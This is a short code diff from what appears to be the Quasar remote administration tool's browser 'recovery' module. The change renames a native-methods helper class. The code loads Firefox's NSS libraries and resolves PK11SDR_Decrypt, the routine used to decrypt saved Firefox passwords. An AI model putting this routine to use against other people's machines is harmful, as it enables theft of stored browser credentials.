@@ -32,11 +32,11 @@ namespace Quasar.Client.Recovery.Browsers
         public long Init(string configDirectory)
         {
             string mozillaPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Mozilla Firefox\");
-            Mozglue = NativeMethods.LoadLibrary(Path.Combine(mozillaPath, "mozglue.dll"));
-            NSS3 = NativeMethods.LoadLibrary(Path.Combine(mozillaPath, "nss3.dll"));
-            NSS_Init = NativeMethods.GetProcAddress2<NssInit>("nss3.dll", "NSS_Init");
-            PK11SDR_Decrypt = NativeMethods.GetProcAddress2<Pk11sdrDecrypt>("nss3.dll", "PK11SDR_Decrypt");
-            NSS_Shutdown = NativeMethods.GetProcAddress2<NssShutdown>("nss3.dll", "NSS_Shutdown");
+            Mozglue = ClientNatives.LoadLibrary(Path.Combine(mozillaPath, "mozglue.dll"));
+            NSS3 = ClientNatives.LoadLibrary(Path.Combine(mozillaPath, "nss3.dll"));
+            NSS_Init = ClientNatives.GetProcAddress2<NssInit>("nss3.dll", "NSS_Init");
+            PK11SDR_Decrypt = ClientNatives.GetProcAddress2<Pk11sdrDecrypt>("nss3.dll", "PK11SDR_Decrypt");
+            NSS_Shutdown = ClientNatives.GetProcAddress2<NssShutdown>("nss3.dll", "NSS_Shutdown");
             return NSS_Init(configDirectory);
         }
 
@@ -105,8 +105,8 @@ namespace Quasar.Client.Recovery.Browsers
             if (disposing)
             {
                 NSS_Shutdown();
-                NativeMethods.FreeLibrary(NSS3);
-                NativeMethods.FreeLibrary(Mozglue);
+                ClientNatives.FreeLibrary(NSS3);
+                ClientNatives.FreeLibrary(Mozglue);
             }
         }
     }
